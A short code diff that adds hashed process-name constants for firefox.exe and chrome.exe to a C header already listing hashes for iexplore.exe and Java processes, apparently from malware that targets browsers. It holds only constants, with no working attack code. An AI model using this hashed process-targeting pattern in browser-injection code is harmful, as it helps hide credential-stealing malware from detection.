@@ -53,7 +53,8 @@
 	#define PROCESS_HASH_IE     0x250DFA8F /* iexplore.exe */
 #endif
 
-
+#define PROCESS_HASH_FIREFOX 0x7712FEAE /* firefox.exe */
+#define PROCESS_HASH_CHROME  0xBD3CC33A /* chrome.exe */
 
 #define PROCESS_HASH_JAVA   0x150CFBD3 /* java.exe */
 #define PROCESS_HASH_JAVAW  0x1F1AA76A /* javaw.exe */
